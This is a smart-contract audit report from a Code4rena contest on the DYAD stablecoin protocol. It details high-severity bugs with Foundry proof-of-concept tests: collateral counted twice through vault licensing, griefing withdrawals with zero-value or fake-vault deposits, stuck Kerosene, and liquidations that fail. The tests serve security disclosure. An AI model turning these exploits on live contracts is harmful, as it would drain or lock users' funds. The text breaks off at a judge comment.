[H-01] Design flaw and mismanagement in vault licensing leads to double counting in collateral ratios and positions collateralized entirely with kerosine
Submitted byMaroutis, also found byfalconhoof, pontifex (1,2),0xleadwizard,Hueber,grearlake,josephdara,0xlemon,gumgumzum,Emmanuel,ych18,Al-Qa-qa, adam-idarrha (1,2),CodeWasp, Honour (1,2), 0xabhay (1,2), oakcobalt (1,2), SBSecurity (1,2),Infect3d,SpicyMeatball, Limbooo (1,2),AM,LeoGold,Daniel526,Giorgio,KupiaSec, Circolors (1,2),neocrao,0xtankr,The-Seraphs,0xShitgem,poslednaya,ke1caM, ljj (1,2), TheSchnilch (1,2),bhilare_, n4nika (1,2),btk, iamandreiski (1,2,3), VAD37 (1,2),0xnilay,Aamir,carlitox477,n0kto,petro_1912,Abdessamed,itsabinashb,shaflow2, web3km (1,2),dimulski,ZanyBonzy, shikhar229169 (1,2), T1MOH (1,2),zigtur,Topmark,Krace,cinderblock,Egis_Security, AlexCzm (1,2),3docSec,PoeAudits,TheSavageTeddy,kennedy1030,0x486776, and zhaojohnson (1,2)
https://github.com/code-423n4/2024-04-dyad/blob/cd48c684a58158de444b24854ffd8f07d046c31b/script/deploy/Deploy.V2.s.sol#L64-L65
https://github.com/code-423n4/2024-04-dyad/blob/cd48c684a58158de444b24854ffd8f07d046c31b/script/deploy/Deploy.V2.s.sol#L95-L96
Impact
Due to a design flaw in the protocol’s management of vault licensing and the deploy script, a significant risk exists where collateral can be counted twice in the calculation of the Collateralization Ratio. This occurs because WETH vaults are incorrectly licensed to both theKeroseneManagerandVaultLicenser, allowing users to register the same asset and their NFT ID in both Kerosene vaults and normal vaults. This can allow users to exploit this to greatly inflate their CR calculations, misleading the protocol into considering a position more secure than it truly is, which can prevent necessary liquidations and pose significant risk to the protocol.
However, a user can also register his ID and thekeroseneVaultas a normalvaultbecause the script calls the licensing function for thekerosineVaultsusing theVaultLicenserrather than thekerosineManager. This can lead to positions entirely collateralized with kerosene token. Which is not what protocol intends to do and is very risky as the kerosene token is endogenous and has a manipulable asset price.
Proof of Concept
Basically, there are two exploits with devastating impacts on the protocol:
Exploit #1:TheDeployV2script calls both contract licensing tx functions on the weth vault.
kerosineManager.add(address(ethVault));kerosineManager.add(address(wstEth));
and:
vaultLicenser.add(address(ethVault));vaultLicenser.add(address(wstEth));
The licensing via thekerosineManageralso has to be done, because the weth vaults will be used by theUnboundedKerosineVaultcontract during the price calculation of the kerosine asset.
This can be exploited where users can call bothVaultManagerV2::addKeroseneandVaultManagerV2::addfunctions with their id and the weth vault as parameters. TheVaultManagerV2::collatRatiouses bothvaultsandvaultsKerosenemapping to calculate the value of the stored assets. Since, weth vault is added in both mappings the assets be counted twice.
Consider the following test:
functiontest_CanMintSameAmountAsDeposit()public{// address RECEIVER2 = makeAddr("Receiver2");uint256id=mintDNft();uint256id2=mintDNft();// Add vault in both contractsvaultManagerV2.add(id,address(wethVaultV2));vaultManagerV2.add(id2,address(wethVaultV2));vaultManagerV2.addKerosene(id,address(wethVaultV2));// Deposits 1e25 USD of WethdepositV2(weth,id,address(wethVaultV2),1e22);// Price weth 1000// Mint 1e25vaultManagerV2.mintDyad(id,1e25,RECEIVER);// Protocol considers that User has deposited twice the amount in the collateral ratio calculationconsole.log("CR of position",vaultManagerV2.collatRatio(id));// 200%// Position is not liquidatable even if it is only collateralized at 100%vm.expectRevert(IVaultManager.CrTooHigh.selector);vm.prank(RECEIVER);vaultManagerV2.liquidate(id,id2);}
Exploit #2:TheDeployV2script calls the licensing tx functions on the kerosine vaults using thevaultLicenser:
vaultLicenser.add(address(unboundedKerosineVault));// vaultLicenser.add(address(boundedKerosineVault));
This has to be done via thevaultLicenserinstead of thekerosineManagerso that the kerosene vault assets would not be taken into account during the price calculation of the kerosine asset.
A user can just call theVaultManagerV2::addfunction with their ID and kerosine vault as parameters. Since, the kerosine vault will be stored inside thevaultsmappings, some positions can be mostly or entirely collateralized with the kerosine asset, which is not what is intended by the protocol. In fact kerosene is a volatile asset and can cause stability and liquidity issues to the protocol.
Consider the following test:
functiontest_addKeroseneAsExoColl()public{uint256id=mintDNft();uint256id2=mintDNft();// Follow script deployment. Weth Vault is licensed in both VaultManager and KerosineManager// A user can just add his id and the WethVault in the kerosine mapping and kerosineVault in the vault mappingvaultManagerV2.addKerosene(id,address(wethVaultV2));vaultManagerV2.add(id,address(unboundedKerosineVault));// Assume weth was deposited by other usersdepositV2(weth,id2,address(wethVaultV2),1e24);//weth 1000 Usd// User deposits kerosine using idkerosineMock.mint(address(this),1e20);kerosineMock.approve(address(vaultManagerV2),1e20);vaultManagerV2.deposit(id,address(unboundedKerosineVault),1e20);console.log("Kerosine price",unboundedKerosineVault.assetPrice());//9999//Then mint dyadvaultManagerV2.mintDyad(id,1e19,RECEIVER);// => Position 150% collateralized with kerosine tokens// !! User cannot add kerosine bounded or unbounded vaults in the kerosine mapping in the vault Manager// !! and id and weth vault can be added in both kerosene and normal vaults which would make the amount deposited calculated twice in the collateralRatio}
Tools Used
Foundry test
Recommended Mitigation Steps
The design of the licensing part needs to be re-thinked. The issue here is that the vaults mapping of theKerosineManagercontract which is constructed via the methodKerosineManager::addis the same mapping that is used by theUnboundedKerosineVault::assetPricefunction. You can consider creating two separate mappings.
One used only for the price calculation in theUnboundedKerosineVaultassetPricecontract which would only include the classic vaults (weth …); another mapping used for the licensing part which would include the kerosene vaults.
Let’s assume these were implemented, we have now two mappings. TheDeployV2should change as follows:
kerosineManager.addVaultForOracleCalculation(address(ethVault));kerosineManager.addVaultForOracleCalculation(address(wstEth));kerosineManager.add(address(unboundedKerosineVault));kerosineManager.add(address(boundedKerosineVault));
Assuming theaddVaultForOracleCalculationfeeds a mapping that will be used byUnboundedKerosineVault::assetPricewhileadddoesn’t.
shafu0x (DYAD) acknowledged
Note: For full discussion, seehere.

[H-02] Inability to perform partial liquidations allows huge positions to accrue bad debt in the system
Submitted byMrPotatoMagic, also found byMaroutis,peanuts,ArmedGoose,d3e4,OMEN,NentoR,0xtankr,SpicyMeatball,KYP,Shubham,dimulski,Giorgio,Sabit,Egis_Security, andT1MOH
Theliquidate()function allows liquidators to burn DYAD on behalf of an DNft id and receive collateral in return.
The issue is that the current functionality only allows burning of the whole DYAD amount minted by the DNft id. This means that partial liquidations cannot be performed and prevents liquidators from liquidating DYAD minted by whales that hold huge positions in the system. Since the liquidations cannot be performed unless the liquidator can match up to the collateral deposited and DYAD minted by the whale, the system will be undercollaterized causing bad debt to accrue.
The effect of this issue will increase as more such positions exist in the system that cannot be liquidated by the liquidators.
Proof of Concept
In theliquidate()function below, we can see on Line 235 that when theburn()function is called on the DYAD token contract, it burns the whole minted DYAD instead of allowing the liquidator to supply a specific amount they can burn to improve the collateral ratio of the id and the overall health of the system.
But since this is not allowed, liquidators trying to liquidate whales, who have minted a huge amount of DYAD, would fail due to the position being extremely big and the inability of partially liquidate.
File:VaultManagerV2.sol225:functionliquidate(226:uintid,227:uintto228:   )229:external230:isValidDNft(id)231:isValidDNft(to)232:     {233:uintcr=collatRatio(id);234:if(cr>=MIN_COLLATERIZATION_RATIO)revertCrTooHigh();235:dyad.burn(id,msg.sender,dyad.mintedDyad(address(this),id));236:237:238:uintcappedCr=cr<1e18?1e18:cr;239:uintliquidationEquityShare= (cappedCr-1e18).mulWadDown(LIQUIDATION_REWARD);240:uintliquidationAssetShare= (liquidationEquityShare+1e18).divWadDown(cappedCr);241:242:uintnumberOfVaults=vaults[id].length();243:for(uinti=0;i<numberOfVaults;i++) {244:Vaultvault=Vault(vaults[id].at(i));245:uintcollateral=vault.id2asset(id).mulWadUp(liquidationAssetShare);246:247:vault.move(id,to,collateral);248:       }249:emitLiquidate(id,msg.sender,to);250:   }
Recommended Mitigation Steps
Implement a mechanism to allow liquidators to partially liquidate positions. This would also require refactoring the collateral paid out to them based on the amount they cover.
shafu0x (DYAD) commented:
Hmm, but can’t this be solved by flash loaning DYAD?
0xMax1 (DYAD) commented:
Not if loan exceeds market liquidity. Partial liquidations is a feature we should implement.
shafu0x (DYAD) confirmed

[H-03] Attacker can make0valuedeposit()calls to deny user from redeeming or withdrawing collateral
Submitted byMrPotatoMagic, also found by0xAkira,SBSecurity, 0xblack_bird (1,2),dinkras,xyz,falconhoof,Tychai0s,josephdara,0x175,DedOhWale,0xloscar01,0xlemon,djxploit,turvy_fuzz,kartik_giri_47538,sashik_eth,Honour,Pechenite,koo,grearlake,NentoR,Dinesh11G,Dots,KupiaSec,imare,Circolors,pep7siup,Mrxstrange,web3km,forgebyola,alix40,0xtankr,0xDemon,Ryonen,Imp,ke1caM,poslednaya,itsabinashb,Cryptor,asui,steadyman,DPS,VAD37,ljj,btk,TheFabled,c0pp3rscr3w3r,niser93,DMoore,d_tony7470,blutorque,0x77,adam-idarrha,ZanyBonzy,Vasquez,Angry_Mustache_Man,Jorgect,shaflow2,valentin_s2304,zigtur,Sabit,0xAsen,kennedy1030,caglankaan,GalloDaSballo,Giorgio,dimulski,T1MOH,3docSec,AlexCzm,0xabhay,4rdiii,PoeAudits,WildSniper,ptsanev,BiasedMerc,y4y,TheSavageTeddy,carrotsmuggler,Abdessamed,ubl4nk,zhaojohnson,0x486776,lionking927, andKrace
Functiondeposit()uses modifierisValidDNft()instead ofisDNftOwner(), which allows anyone to calldeposit()on behalf of any DNft id.
Impact
Attacker can make user devoid of withdrawing or redeeming collateral by making0valuedeposit()calls. Other than denying users from temporarily withdrawing their collateral, this is also an issue since it could force users into liquidations when they try to take preventative measures on their collateral ratio (especially throughredeemDyad()) in high collateral price volatility situations. If successful, the attacker could then perform the liquidation to profit from the situation.Attacker can make user devoid of removing vault due toid2asset > 0by depositing 1 wei of collateral.
Proof of Concept
First impact:
User callsredeemDyad()(orwithdraw()to directly withdraw collateral) to burn DYAD and withdraw their collateral asset.Attacker frontruns the call with a0valuedeposit()call. This would set theidToBlockOfLastDeposit[id]to the currentblock.number. The call does not revert since0value transfers are allowed.
File:VaultManagerV2.sol127:functiondeposit(128:uintid,129:addressvault,130:uintamount131:   )132:external133:isValidDNft(id)134:   {135:idToBlockOfLastDeposit[id] =block.number;136:Vault_vault=Vault(vault);137:_vault.asset().safeTransferFrom(msg.sender,address(vault),amount);138:_vault.deposit(id,amount);139:   }
When the user’sredeemDyad()call goes through, it internally calls thewithdraw()function, which would cause a revert due to the check on Line 152. The check evaluates to true and reverts since the attacker changes the last deposit block number to the current block through the0valuedeposit()call.
File:VaultManagerV2.sol143:functionwithdraw(144:uintid,145:addressvault,146:uintamount,147:addressto148:   )149:public150:isDNftOwner(id)151:   {152:if(idToBlockOfLastDeposit[id] ==block.number)revertDepositedInSameBlock();153:uintdyadMinted=dyad.mintedDyad(address(this),id);154:Vault_vault=Vault(vault);155:uintvalue=amount*_vault.assetPrice()156:                   *1e18157:                   /10**_vault.oracle().decimals()158:                   /10**_vault.asset().decimals();159:160:if(getNonKeroseneValue(id) -value<dyadMinted)revertNotEnoughExoCollat();161:_vault.withdraw(id,to,amount);162:if(collatRatio(id) <MIN_COLLATERIZATION_RATIO)revertCrTooLow();163:   }
If the collateral ratio of the user falls below the minimum threshold of 1.5e18 (in terms of high volatility of collateral asset price), the attacker could then exploit the situation to liquidate the user using theliquidate()function.
Second impact:
User tries to remove a vault by calling theremove()function.Attacker frontruns the call by making a 1 wei collateral deposit through thedeposit()function. This would increase theid2assetfor the user in the vault.
File:VaultManagerV2.sol127:functiondeposit(128:uintid,129:addressvault,130:uintamount131:   )132:external133:isValidDNft(id)134:   {135:idToBlockOfLastDeposit[id] =block.number;136:Vault_vault=Vault(vault);137:_vault.asset().safeTransferFrom(msg.sender,address(vault),amount);138:_vault.deposit(id,amount);139:   }
User’s call goes through and reverts due to the check on Line 102. This revert occurs sinceid2assetis now 1 wei for the vault the user is trying to remove. Note that although the attacker would be spending gas here, an equal amount of gas would also be required from the user’s side to withdraw the 1 wei. The attack will continue till the user gives up due to the high gas spent behind withdrawing. Another thing to note is that regular users (with no knowledge of contracts) might not have the option to withdraw 1 wei from the frontend, which would require additional overhead from their side to seek help from the team.
File:VaultManagerV2.sol095:functionremove(096:uintid,097:addressvault098:   )099:external100:isDNftOwner(id)101:   {102:if(Vault(vault).id2asset(id) >0)revertVaultHasAssets();103:if(!vaults[id].remove(vault))revertVaultNotAdded();104:emitRemoved(id,vault);105:   }
Recommended Mitigation Steps
Use modifierisDNftOwner()instead ofisValidDNft()on functiondeposit().
Assessed type
Invalid Validation
shafu0x (DYAD) confirmed and commented via duplicate Issue #489:
Good find! We should restrict it to only owner.

[H-04] Attacker can frontrun user’s withdrawals to make them revert without costs
Submitted byLimbooo, also found byahmedaghadi,pontifex,Evo,MiniGlome,favelanky,Infect3d,ArmedGoose,AM,SpicyMeatball,0xleadwizard,HChang26,TheSchnilch,Jorgect, and0xabhay
User’s withdrawals will be prevented from success and an attacker can keep it up without a cost by using a fake vault and a fake token.
Proof of Concept
There is a mechanisms for a flash loan protection that saves the current block number in a mapping of dNft token id; and then prevents it from withdrawing at the same block number. As we can see in theVaultManagerV2::deposit()function, this can be called by anyone with a valid dNft id:
src/core/VaultManagerV2.sol:119:functiondeposit(120:uintid,121:addressvault,122:uintamount123:   )124:external125:isValidDNft(id)126:   {@>127:idToBlockOfLastDeposit[id] =block.number;128:Vault_vault=Vault(vault);129:_vault.asset().safeTransferFrom(msg.sender,address(vault),amount);130:_vault.deposit(id,amount);131:   }
The attacker can use this to prevent any withdrawals in the current block, since it will be checked whenever an owner of dNft token try to withdraw:
src/core/VaultManagerV2.sol:134:functionwithdraw(135:uintid,136:addressvault,137:uintamount,138:addressto139:   )140:public141:isDNftOwner(id)142:   {@>143:if(idToBlockOfLastDeposit[id] ==block.number)revertDepositedInSameBlock();144uintdyadMinted=dyad.mintedDyad(address(this),id);
Test Case (Foundry)
// SPDX-License-Identifier: MITpragmasolidity=0.8.17;import"forge-std/console.sol";import"forge-std/Test.sol";import{DeployV2,Contracts}from"../../script/deploy/Deploy.V2.s.sol";import{Licenser}from"../../src/core/Licenser.sol";import{Parameters}from"../../src/params/Parameters.sol";import{ERC20}from"@solmate/src/tokens/ERC20.sol";import{Vault}from"../../src/core/Vault.sol";import{IAggregatorV3}from"../../src/interfaces/IAggregatorV3.sol";import{IVaultManager}from"../../src/interfaces/IVaultManager.sol";contractFakeERC20isERC20{constructor(stringmemoryname,stringmemorysymbol)ERC20(name,symbol,18) {}functionmint(addressto,uint256amount)external{_mint(to,amount);}}contractFakeVaultTestisTest,Parameters{Contractscontracts;addressattacker;FakeERC20fakeERC20;VaultfakeVault;functionsetUp()public{contracts=newDeployV2().run();// Add Vault Manager V2 to the main licenser used by DYAD token, it will allow Vault Manager V2 minting, burning DYAD.vm.prank(MAINNET_OWNER);Licenser(MAINNET_VAULT_MANAGER_LICENSER).add(address(contracts.vaultManager));attacker=makeAddr('attacker');fakeERC20=newFakeERC20('Fake','FAKE');fakeVault=newVault(contracts.vaultManager,ERC20(fakeERC20),IAggregatorV3(address(0x0)));fakeERC20.mint(attacker,type(uint256).max);}functiontestPoC_attackerCanFrontRunUserWithdrawalsToPreventThemFromWithdrawing()public{// Make a new address for alice, and mint some ether.addressalice=makeAddr('alice');vm.deal(alice,2ether);// Misc addresses (WETH and WETH Vault).addressweth=address(contracts.ethVault.asset());addressethVault=address(contracts.ethVault);// Alice start interactionvm.startPrank(alice);// Mint new dNft token for aliceuintdNftId=contracts.vaultManager.dNft().mintNft{value:1ether}(alice);// Add WETH vault to the newly created dNftcontracts.vaultManager.add(dNftId,ethVault);// Deposit Ether to WETH contract to mint weth tokens(boolsuccess, ) =weth.call{value:1ether}(abi.encodeWithSignature("deposit()"));require(success);// Deposit Weth to vault through Vault Managercontracts.ethVault.asset().approve(address(contracts.vaultManager),1ether);contracts.vaultManager.deposit(dNftId,ethVault,1ether);vm.stopPrank();vm.roll(block.number+1);// attacker approve vault manager to spend his fake erc20vm.startPrank(attacker);fakeVault.asset().approve(address(contracts.vaultManager),type(uint256).max);// whenever alice try to withdraw, attacker front-runs alice and make him unable to withdraw at current block// by depositing to alice's dNft a fake token with fake vaultcontracts.vaultManager.deposit(dNftId,address(fakeVault),1ether);vm.stopPrank();// alice try to withdraw but the call reverted with DepositedInSameBlock error// indicate that the attacker success to prevent the withdrawalvm.expectRevert(IVaultManager.DepositedInSameBlock.selector);vm.prank(alice);contracts.vaultManager.withdraw(dNftId,ethVault,1ether,alice);}}
Tools Used
Foundry
Recommended Mitigation
Consider limiting anyone with any token vaults to updateidToBlockOfLastDeposit. One of these mitigations can be used:
Prevent anyone to deposit to unowned dNft token.Allow to only depositing using licensed vaults, so if the attacker try to front-runs he will lose some real tokens.Since this used to protect against flash loans, no need to use it with all token vaults. This should be used only with vaults that can be used to mint DYAD. So, we can check if the deposit included in thevaultLicenserandkeroseneManagerlicenser, we need to update theidToBlockOfLastDeposit. Here is a git diff for this fix:
diff --git a/src/core/VaultManagerV2.sol b/src/core/VaultManagerV2.solindex fc574a8..73dbb6b 100644--- a/src/core/VaultManagerV2.sol+++ b/src/core/VaultManagerV2.sol@@ -124,7 +124,8 @@ contract VaultManagerV2 is IVaultManager, Initializable {externalisValidDNft(id){-    idToBlockOfLastDeposit[id] = block.number;+    if (vaultLicenser.isLicensed(vault) || keroseneManager.isLicensed(vault))+      idToBlockOfLastDeposit[id] = block.number;Vault _vault = Vault(vault);_vault.asset().safeTransferFrom(msg.sender, address(vault), amount);_vault.deposit(id, amount);
Assessed type
Invalid Validation
Koolex (judge) increased severity to High
shafu0x (DYAD) confirmed

[H-05] Unable to withdraw Kerosene fromvaultmanagerv2::withdrawas it expects avault.oracle()method which is missing in Kerosene vaults
Submitted byCircolors, also found bydinkras,ahmedaghadi,0x175,Evo,0xfox,d3e4,Al-Qa-qa,0xlemon,Mahmud,Honour,sashik_eth,SBSecurity,amaron,TheSchnilch,Infect3d,ducanh2706,Limbooo,3th,0xShitgem,ke1caM,ljj,bhilare_,iamandreiski, Josh4324 (1,2),0xSecuri,bbl4de,Aamir,btk,alix40,0xnilay,steadyman,shaflow2,cinderblock,AlexCzm,y4y,Egis_Security,web3km, 0xAlix2 (1,2),0x486776,itsabinashb,carrotsmuggler,dimulski, and4rdiii
VaultManagerV2has onewithdrawfunction responsible for withdrawing both exogenous collateral (weth/wsteth) and endogenous collateral (Kerosene). However, the function expects thevaultpassed as an argument to have anoraclemethod. This is the case forVaultcontracts, but not the case for theBoundedKerosineVaultorUnboundedKerosineVaultcontracts. This means that whenever a user attempts to withdraw Kerosene deposited into the contract the call will revert, meaning the Kerosene remains stuck in the contract permanently.
Proof of Concept
Add the following test tov2.t.solto highlight this:
functiontestCannotWithdrawKero()public{// Set up alicelicenseVaultManager();addressalice=makeAddr("alice");uintaliceTokenId=sendNote(alice);sendKerosene(alice,10_000ether);// Alice deposits kerosene into the protocolvm.startPrank(alice);contracts.vaultManager.addKerosene(aliceTokenId,address(contracts.unboundedKerosineVault));Kerosine(MAINNET_KEROSENE).approve(address(contracts.vaultManager),10_000ether);contracts.vaultManager.deposit(aliceTokenId,address(contracts.unboundedKerosineVault),10_000ether);assertEq(ERC20(MAINNET_KEROSENE).balanceOf(alice),0);vm.roll(block.number+42);// Alice attempts to withdraw her kerosene but the tx revertscontracts.vaultManager.withdraw(aliceTokenId,address(contracts.unboundedKerosineVault),10_000ether,alice);}
The test reverts with the following stack traces:
├─ [9243] VaultManagerV2::withdraw(645,UnboundedKerosineVault: [0x416C42991d05b31E9A6dC209e91AD22b79D87Ae6],10000000000000000000000[1e22],alice: [0x328809Bc894f92807417D2dAD6b7C998c1aFdac6])│   ├─ [558]0xDc400bBe0B8B79C07A962EA99a642F5819e3b712::ownerOf(645) [staticcall]│   │   └─ ← [Return] alice: [0x328809Bc894f92807417D2dAD6b7C998c1aFdac6]│   ├─ [2623]0x305B58c5F6B5b6606fb13edD11FbDD5e532d5A26::mintedDyad(VaultManagerV2: [0xA8452Ec99ce0C64f20701dB7dD3abDb607c00496],645) [staticcall]│   │   └─ ← [Return]0│   ├─ [261] UnboundedKerosineVault::asset() [staticcall]│   │   └─ ← [Return]0xf3768D6e78E65FC64b8F12ffc824452130BD5394│   ├─ [262]0xf3768D6e78E65FC64b8F12ffc824452130BD5394::decimals() [staticcall]│   │   └─ ← [Return]18│   ├─ [214] UnboundedKerosineVault::oracle() [staticcall]│   │   └─ ← [Revert] EvmError:Revert│   └─ ← [Revert] EvmError:Revert
Recommended Mitigation
Given that thevalueof exogenous and endogenous collateral is calculated differently it is necessary to handle withdrawal of exogenous collateral and Kerosene differently. It would avoid added complexity to the function logic to have two differentwithdrawandwithdrawKerosenefunctions.
shafu0x (DYAD) confirmed and commented:
Good find. This is correct.
Note: For full discussion, seehere.

[H-06] User can get their Kerosene stuck because of an invalid check on withdraw
Submitted by0xAlix2, also found byAamir, oakcobalt (1,2,3), MrPotatoMagic (1,2),Evo,favelanky,0xlemon,0xfox,TheSchnilch,Honour,SpicyMeatball,koo,Limbooo,KupiaSec,alix40,forgebyola,ke1caM,Jorgect,bhilare_,Dudex_2004,0xnev,petro_1912,FastChecker,Abdessamed,shikhar229169,Egis_Security,kennedy1030, and3docSec
The protocol allows users to deposit both Kerosene and non-Kerosene collateral, to mint Dyad users should have an equal value of non-Kerosene (exogenous) collateral. So users should have 100% non-Kerosene and the rest could be Kerosene collateral.
However, inVaultManagerV2::withdraw, the protocol allows users to withdraw Kerosene and non-Kerosene collateral, by just passing the corresponding vault. When withdrawing it checks if the (non-Kerosene value - withdraw value) is less than the minted Dyad, if so it reverts. This is also checked when withdrawing Kerosene collateral, which is wrong as it’s comparing non-Kerosene value with Kerosene value.
Ultimately, this blocks users from withdrawing their Kerosene collateral, even if they should be able to. Let’s take an example, a user has$100non-Kerosene and$100Kerosene collateral, and you have 100 Dyad minted, that’s a 200% ratio. If he tries to withdraw$1Kerosene, the TX will revert, becausegetNonKeroseneValue(id) = 100-value = 1<Dyad minted = 100, which again is a wrong check.
Proof of Concept
This assumes that a reported bug is fixed, which is using the correct licenser. To overcome this we had to manually change the licenser inaddKeroseneandgetKeroseneValue.
Because of another reported issue, a small change should be made to the code to workaround it; inVaultManagerV2::withdraw, replace_vault.oracle().decimals()with8. This just sets the oracle decimals to a static value of 8.
Test POC:
Make sure to fork the main net and set the block number to19703450:
contractVaultManagerTestisVaultManagerTestHelper{KerosinekeroseneV2;LicenservaultLicenserV2;VaultManagerV2vaultManagerV2;VaultethVaultV2;VaultWstEthwstEthV2;KerosineManagerkerosineManagerV2;UnboundedKerosineVaultunboundedKerosineVaultV2;BoundedKerosineVaultboundedKerosineVaultV2;KerosineDenominatorkerosineDenominatorV2;OracleMockwethOracleV2;addressbob=makeAddr("bob");addressalice=makeAddr("alice");ERC20wrappedETH=ERC20(MAINNET_WETH);ERC20wrappedSTETH=ERC20(MAINNET_WSTETH);DNftdNFT=DNft(MAINNET_DNFT);functionsetUpV2()public{(Contractsmemorycontracts,OracleMocknewWethOracle) =newDeployV2().runTestDeploy();keroseneV2=contracts.kerosene;vaultLicenserV2=contracts.vaultLicenser;vaultManagerV2=contracts.vaultManager;ethVaultV2=contracts.ethVault;wstEthV2=contracts.wstEth;kerosineManagerV2=contracts.kerosineManager;unboundedKerosineVaultV2=contracts.unboundedKerosineVault;boundedKerosineVaultV2=contracts.boundedKerosineVault;kerosineDenominatorV2=contracts.kerosineDenominator;wethOracleV2=newWethOracle;vm.startPrank(MAINNET_OWNER);Licenser(MAINNET_VAULT_MANAGER_LICENSER).add(address(vaultManagerV2));boundedKerosineVaultV2.setUnboundedKerosineVault(unboundedKerosineVaultV2);vm.stopPrank();}functiontest_CannotWithdrawKerosene()public{setUpV2();vm.prank(MAINNET_OWNER);keroseneV2.transfer(bob,100_000e18);deal(MAINNET_WETH,bob,1_000e18);deal(MAINNET_WETH,address(ethVaultV2),5_000e18);uint256bobNFT=dNFT.mintNft{value:1ether}(bob);// Bob adds Weth and Unbounded Kerosene vaults to his NFT// Bob deposits 1 Weth and 25,000 Kerosene// Bob mints Dyad exactly equal to the non-Kerosene value (1 Weth)vm.startPrank(bob);wrappedETH.approve(address(vaultManagerV2),type(uint256).max);keroseneV2.approve(address(vaultManagerV2),type(uint256).max);vaultManagerV2.add(bobNFT,address(ethVaultV2));vaultManagerV2.addKerosene(bobNFT,address(unboundedKerosineVaultV2));vaultManagerV2.deposit(bobNFT,address(ethVaultV2),1e18);vaultManagerV2.deposit(bobNFT,address(unboundedKerosineVaultV2),25_000e18);vaultManagerV2.mintDyad(bobNFT,vaultManagerV2.getNonKeroseneValue(bobNFT),bob);vm.stopPrank();// Verify that Bob's collateral ratio is greater than 300%assertGt(vaultManagerV2.collatRatio(bobNFT),2*vaultManagerV2.MIN_COLLATERIZATION_RATIO());vm.roll(1);// Bob tries to withdraw 1 Kerosene, revertsvm.prank(bob);vm.expectRevert(abi.encodeWithSelector(IVaultManager.NotEnoughExoCollat.selector));vaultManagerV2.withdraw(bobNFT,address(unboundedKerosineVaultV2),1e18,bob);}}
Recommended Mitigation Steps
Differentiate between Kerosene and non-Kerosene USD values when withdrawing either of them.
Assessed type
Invalid Validation
shafu0x (DYAD) confirmed and commented:
This is correct. Good find!

[H-07] Missing enough exogenous collateral check inVaultManagerV2::liquidatemakes the liquidation revert even if (DYAD Minted>Non Kerosene Value)
Submitted byshikhar229169, also found byHonour,Circolors,Maroutis,KupiaSec,3th,ke1caM,0xfox,0xSecuri,Sancybars,Strausses,kennedy1030,Stormreckson, and0x486776
The vulnerability is present in theVaultManagerV2::liquidatefunction where it doesn’t have any check for whether the vault has enough exogenous collateral leading to no liquidation even if the non-kerosene value is less than DYAD minted.
It is intended that the position of user’s DNFT has enough exogenous collateral and should be 150% overcollateralized. But there will arise a case when a position is no doubt 150% collateralized by the support of kerosene value, but the non-kerosene value is reduced below the DYAD token minted. As a result of which the vault doesn’t have enough required exogenous collateral. But due to the missing check for enough non-kerosene value collateral in liquidate function, the liquidation will never happen and reverts.
Impact
The position will never be liquidated, for the above discussed case. As a result of which the (DYAD Minted>Non Kerosene Value), making the value of DYAD to fall.
Proof of Concept
Add the below test file intest/fork/v2.t.sol, and add the imports:
import {DNft} from"../../src/core/DNft.sol";import {ERC20} from"@solmate/src/tokens/ERC20.sol";import {OracleMock} from"../OracleMock.sol";import {IVaultManager} from"../../src/core/VaultManagerV2.sol";
Run the test (Replace the$ETH_MAINNET_RPC_URLby your eth mainnet rpc url):
forge test --mt test_LiquidationReverts_EvenIfVaultHasNotEnoughExoCollateral --fork-url $ETH_MAINNET_RPC_URL
functiontest_LiquidationReverts_EvenIfVaultHasNotEnoughExoCollateral() public {address user =makeAddr("user");vm.deal(user,100ether);Licenser licenser =Licenser(MAINNET_VAULT_MANAGER_LICENSER);vm.prank(MAINNET_OWNER);licenser.add(address(contracts.vaultManager));DNft dnft =DNft(MAINNET_DNFT);vm.startPrank(user);uint256 id =dnft.mintNft{value:10ether}(user);// user adds vaultcontracts.vaultManager.add(id,address(contracts.ethVault));contracts.vaultManager.addKerosene(id,address(contracts.wstEth));// user adds weth to the vaultdeal(MAINNET_WETH, user,10ether);// get 10 weth to the userERC20(MAINNET_WETH).approve(address(contracts.vaultManager),10ether);contracts.vaultManager.deposit(id,address(contracts.ethVault),10ether);// user adds wsteth to the vaultdeal(MAINNET_WSTETH, user,10ether);// get 10 wsteth to the userERC20(MAINNET_WSTETH).approve(address(contracts.vaultManager),10ether);contracts.vaultManager.deposit(id,address(contracts.wstEth),10ether);// user mints DYAD tokenuint256 nonKeroseneValue =contracts.vaultManager.getNonKeroseneValue(id);// user mints DYAD equal to the usd value of their non-kerosene collateraluint256 dyadToMint = nonKeroseneValue;contracts.vaultManager.mintDyad(id, dyadToMint, user);// now the value of weth falls to 90%_manipulateWethPrice();// now get the nonKeroseneValueuint256 newNonKeroseneValue =contracts.vaultManager.getNonKeroseneValue(id);// non kerosene usd value reduced, as weth price reducedassert(newNonKeroseneValue < dyadToMint);// now it is intended that the user should be liquidated by a liquidator// but due to missing exogenous collateral check, the liquidation will not happenvm.stopPrank();address liquidator =makeAddr("liquidator");vm.deal(liquidator,100ether);vm.startPrank(liquidator);uint256 liquidatorId =dnft.mintNft{value:10ether}(liquidator);// the liquidation reverts as mentioned, even if (dyadMinted > nonKeroseneValue)// thus shows unintended behaviourvm.expectRevert(IVaultManager.CrTooHigh.selector);contracts.vaultManager.liquidate(id, liquidatorId);vm.stopPrank();}function_manipulateWethPrice() internal {(, int256 ans, , , ) =contracts.ethVault.oracle().latestRoundData();OracleMock oracleMock =newOracleMock(uint256(ans));vm.etch(address(contracts.ethVault.oracle()),address(oracleMock).code);vm.warp(1);OracleMock(address(contracts.ethVault.oracle())).setPrice(uint256(ans) *90e18/100e18);}
Tools Used
Unit Test in Foundry
Recommended Mitigation Steps
Update the line 214 inVaultManagerV2.sol:
- if (cr >= MIN_COLLATERIZATION_RATIO) revert CrTooHigh();+ if (cr >= MIN_COLLATERIZATION_RATIO && getNonKeroseneValue(id) >= dyad.mintedDyad(address(this), id)) revert CrTooHigh();
Assessed type
Context
0xMax1 (DYAD) commented:
Kerosene should be included in the transfer upon liquidation.
shafu0x (DYAD) confirmed
Koolex (judge) commented:
